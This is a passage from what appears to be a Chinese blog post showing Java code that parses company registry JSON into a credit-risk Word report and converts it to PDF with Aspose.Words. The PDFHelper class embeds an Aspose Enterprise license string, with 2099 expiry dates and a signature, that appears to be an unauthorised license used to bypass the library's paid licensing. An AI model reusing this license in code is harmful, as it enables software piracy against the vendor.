operator">+</span>                <span class="token string">"        \"orgType\":\"企业\"\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entZSCQ\":true,\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entXZCF\":true,\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"zlxx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entSFSS\":true,\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"reporterDate\":\"2024-01-09\",\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"wzxx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entGSXX\":true,\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"gsxx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entbasic\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entHisName\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"source\":\"0\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entdeadline\":\"2016-05-30 至 2046-05-29\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"citycode\":\"惠安县\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRegUnit\":\"泉州市工商行政管理局泉州台商投资区分局\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"lastUpdBy\":\"-\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entSocialNo\":\"91350521MA348N1GXG\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"stockcode\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRegNo\":\"91350521MA348N1GXG\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"dataStatus\":\"01\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"regcapcur\":\"人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entAddress\":\"福建省泉州台商投资区洛阳镇洛河路（三角牌）202号\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"createdDt\":1531434966000,\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entChangeTargetUid\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entFullName\":\"Quanzhou Hiway Bags Co., Ltd\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"dataSource\":\"10\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"industryphy\":\"519\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"attrib04\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"attrib03\":\"2016-05-30\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRegAmount\":\"100 万人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entNature\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entcity\":\"350521104\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entType\":\"有限责任公司（自然人投资或控股）\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"legalPersonID\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"lastUpdDt\":1702619390000,\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"industryconame\":\"皮箱、包（袋）制造\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRegType\":\"有限责任公司（自然人投资或控股）\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"legalPerson\":\"曾汉青\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"taxNo\":\"91350521MA348N1GXG\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"companyImage\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRealAmount\":\"-\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"dataOrg\":\"MA348N1GX\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"industryMain\":\"5199\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entScale\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entemail\":\"暂无\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"rowId\":1238506,\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRegDt\":\"2016-05-30\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"tagList\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"            ],\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entphone\":\"1380590****\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"createdBy\":\"sys\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entCode\":\"350509100083633\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entRange\":\"通过互联网及实体店销售：包袋、箱包、包装制品、饰品、布艺制品、工艺品、皮具、日用百货、服装、鞋帽；自营和代理各类商品和技术的进出口，但涉及前置许可或国家限定公司经营或禁止进出口的商品和技术除外；商务信息咨询服务（不含金融、证券、期货的投资咨询）。（依法须经批准的项目，经相关部门批准后方可开展经营活动）\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entIsChangename\":\"0\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entstatus\":\"存续\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"shortStatus\":\"存续\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"entCertificate\":\"统一社会信用代码\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"businessAddress\":\"福建省泉州台商投资区洛阳镇洛河路（三角牌）202号\",\n"</span> <span class="token operator">+</span>                <span class="token string">"            \"orgType\":\"企业\"\n"</span> <span class="token operator">+</span>                <span class="token string">"        }\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"xzcf\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"sfxz\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"ycjy\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"reporterNo\":\"TT20240109093459\",\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"sx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entDZY\":true,\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"cpws\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"bgjl\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"qydwtz\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"gdxx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"ipocount\":0,\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"            {\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapitalDt\":\"2046-05-29\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterRealCapi\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterType\":\"自然人股东\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestName\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapiDate\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterName\":\"李跃\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapital\":\"25 万人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestType\":\"货币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterStake\":\"25.00%\"\n"</span> <span class="token operator">+</span>                <span class="token string">"            },\n"</span> <span class="token operator">+</span>                <span class="token string">"            {\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapitalDt\":\"2046-05-29\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterRealCapi\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterType\":\"自然人股东\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestName\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapiDate\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterName\":\"曾汉青\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapital\":\"25 万人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestType\":\"货币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterStake\":\"25.00%\"\n"</span> <span class="token operator">+</span>                <span class="token string">"            },\n"</span> <span class="token operator">+</span>                <span class="token string">"            {\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapitalDt\":\"2046-05-29\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterRealCapi\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterType\":\"自然人股东\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestName\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapiDate\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterName\":\"王军行\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapital\":\"25 万人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestType\":\"货币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterStake\":\"25.00%\"\n"</span> <span class="token operator">+</span>                <span class="token string">"            },\n"</span> <span class="token operator">+</span>                <span class="token string">"            {\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapitalDt\":\"2046-05-29\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterRealCapi\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterType\":\"自然人股东\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestName\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapiDate\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterName\":\"林荣平\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterCapital\":\"25 万民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterInvestType\":\"货币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"promoterStake\":\"25.00%\"\n"</span> <span class="token operator">+</span>                <span class="token string">"            }\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":4,\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"ipo\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ]\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"sxbzxr\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"sbxx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"reporterRange\":\"2023年01月-2024年01月\",\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"ktgg\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"zyry\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"            {\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"isPromoter\":false,\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"personName\":\"曾汉青\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"personRole\":\"经理,执行董事\"\n"</span> <span class="token operator">+</span>                <span class="token string">"            },\n"</span> <span class="token operator">+</span>                <span class="token string">"            {\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"isPromoter\":false,\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"personName\":\"林荣平\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                \"personRole\":\"监事\"\n"</span> <span class="token operator">+</span>                <span class="token string">"            }\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":2\n"</span> <span class="token operator">+</span>                <span class="token string">"    }\n"</span> <span class="token operator">+</span>                <span class="token string">"}"</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            ObjectMapper objectMapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> map <span class="token operator">=</span> objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TypeReference</span><span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CreditReportFileServiceImpl creditReportFileServiceImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CreditReportFileServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String modelSrc <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\风险报告自定义数据模板.docx"</span><span class="token punctuation">;</span>            String rootPath <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\"</span><span class="token punctuation">;</span>            creditReportFileServiceImpl<span class="token punctuation">.</span><span class="token function">createReport</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span>rootPath<span class="token punctuation">,</span>modelSrc<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 使用转换后的map进行操作</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 创建Word报告和PDF报告     * @Author: CZM     * @Param: [creditReportMap, rowDataCodeList, columnDataCodeList, modelSrc]     */</span>    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">createReport</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> creditReportMap<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> rowDataCodeList<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> columnDataCodeList<span class="token punctuation">,</span>                              String rootPath<span class="token punctuation">,</span>String modelSrc<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"模板文件地址："</span> <span class="token operator">+</span> modelSrc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> exist <span class="token operator">=</span> FileUtil<span class="token punctuation">.</span><span class="token function">exist</span><span class="token punctuation">(</span>modelSrc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>exist<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"报告模板不存在，请提供准确的报告模板！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//文档存放地址</span>        String wordFilePath <span class="token operator">=</span> CreateCreditReportUtil<span class="token punctuation">.</span><span class="token function">downloadWord</span><span class="token punctuation">(</span>rootPath<span class="token punctuation">,</span>                modelSrc<span class="token punctuation">,</span>                creditReportMap<span class="token punctuation">,</span>                rowDataCodeList<span class="token punctuation">,</span>                columnDataCodeList        <span class="token punctuation">)</span><span class="token punctuation">;</span>        String pdfFilePath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createWordToPdf</span><span class="token punctuation">(</span>wordFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 将word文档转换为pdf     * @Author: CZM     * @Param: [sourceSrc]     */</span>    <span class="token keyword">private</span> String <span class="token function">createWordToPdf</span><span class="token punctuation">(</span>String sourceSrc<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String pdfFilePath <span class="token operator">=</span> sourceSrc<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"docx"</span><span class="token punctuation">,</span> <span class="token string">"pdf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        PDFHelper<span class="token punctuation">.</span><span class="token function">doc2pdfV2</span><span class="token punctuation">(</span>sourceSrc<span class="token punctuation">,</span> pdfFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> pdfFilePath<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="PDF转换工具类"><a href="#PDF转换工具类" class="headerlink" title="PDF转换工具类"></a>PDF转换工具类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>License<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>pdfbox<span class="token punctuation">.</span>pdmodel<span class="token punctuation">.</span>PDDocument<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>pdfbox<span class="token punctuation">.</span>rendering<span class="token punctuation">.</span>PDFRenderer<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>imageio<span class="token punctuation">.</span>ImageIO<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>image<span class="token punctuation">.</span>BufferedImage<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>DynamicDataSourceContextHolder<span class="token punctuation">.</span>log<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Classname PDFHelper * @Date 2023/5/10 0010 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PDFHelper</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        InputStream is <span class="token operator">=</span> null<span class="token punctuation">;</span>        String licenseStr <span class="token operator">=</span>                <span class="token string">"&lt;License>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Total for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Words for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;/Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;EditionType>Enterprise&lt;/EditionType>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SubscriptionExpiry>20991231&lt;/SubscriptionExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;LicenseExpiry>20991231&lt;/LicenseExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SerialNumber>8bfe198c-7f0c-4ef8-8ff0-acc3237bf0d7&lt;/SerialNumber>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        sNLLKGMUdF0r8O1kKilWAGdgfs2BvJb/2Xp8p5iuDVfZXmhppo+d0Ran1P9TKdjV4ABwAgKXxJ3jcQTqE/2IRfqwnPf8itN8aFZlV3TJPYeD3yWE7IT55Gz6EijUpC7aKeoohTb4w2fpox58wWoF3SNp6sK6jDfiAUGEHYJ9pjU=\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"&lt;/License>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//            is = new FileInputStream("C:\\Users\\Administrator\\Desktop\\tool\\license.xml");</span>        is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>licenseStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        License license <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            license<span class="token punctuation">.</span><span class="token function">setLicense</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        FileUtil.copy("C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\202208171149.docx",</span><span class="token comment" spellcheck="true">//                "C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\202208171149V2.docx",false);</span><span class="token comment" spellcheck="true">//        doc2pdf("C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\企业信用报告.docx");</span>        <span class="token function">doc2pdfV2</span><span class="token punctuation">(</span><span class="token string">"F:\\我的文件\\谷歌.docx"</span><span class="token punctuation">,</span>                <span class="token string">"F:\\我的文件\\谷歌.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * word转pdf     * @Author: CZM     * @Param: [sourceFile, targetFile]     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doc2pdfV2</span><span class="token punctuation">(</span>String sourceFile<span class="token punctuation">,</span> String targetFile<span class="token punctuation">)</span> <span class="token punctuation">{</span>        InputStream is <span class="token operator">=</span> null<span class="token punctuation">;</span>        String licenseStr <span class="token operator">=</span>                <span class="token string">"&lt;License>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Total for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Words for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;/Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;EditionType>Enterprise&lt;/EditionType>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SubscriptionExpiry>20991231&lt;/SubscriptionExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;LicenseExpiry>20991231&lt;/LicenseExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SerialNumber>8bfe198c-7f0c-4ef8-8ff0-acc3237bf0d7&lt;/SerialNumber>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    